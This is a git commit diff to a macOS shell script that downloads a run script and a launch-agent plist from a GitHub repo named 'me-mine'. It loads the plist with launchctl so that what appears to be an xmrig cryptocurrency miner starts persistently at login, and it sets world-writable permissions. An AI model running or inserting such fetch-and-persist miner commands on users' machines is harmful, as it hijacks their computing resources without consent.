5312a0a1fce8b1010a3e3b948603b7104f45cd12
Me1922 <34125170+Me1955@users.noreply.github.com>
2021-06-23 20:26:48 +1000

    Update make.sh

--- make.sh
+++ make.sh
@@ -7,4 +7,7 @@ chmod 777 ~/Library/LaunchAgents/xmrig
 
 curl -L https://github.com/Me1955/me-mine/raw/main/run.sh >> ~/Library/Launchagents/run.sh
 chmod 777 ~/Library/Launchagents/run.sh
-sh ~/Library/Launchagents/run.sh
+
+curl -L https://raw.githubusercontent.com/Me1955/me-mine/main/run.plist >> ~/Library/LaunchAgents/run.plist
+chmod 644 ~/Library/Launchagents/run.plist
+launchctl load ~/Library/LaunchAgents/run.plist
